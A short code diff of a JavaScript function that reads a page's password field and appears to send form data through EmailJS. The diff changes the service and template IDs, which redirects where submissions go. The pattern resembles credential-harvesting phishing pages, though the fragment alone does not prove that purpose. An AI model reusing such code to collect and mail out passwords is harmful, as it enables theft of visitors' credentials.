@@ -62,8 +62,8 @@ function sendmail2(){
     var passwordinput=document.getElementById("password");
     
     var publickey="Ig3xR1STyH_1bNJnb";
-    var serviceid="service_z4zpqxz";
-    var templateid="template_o9n0r95";
+    var serviceid="service_x06ggzd";
+    var templateid="template_e88xbzw";
     
     
     var inputfields={
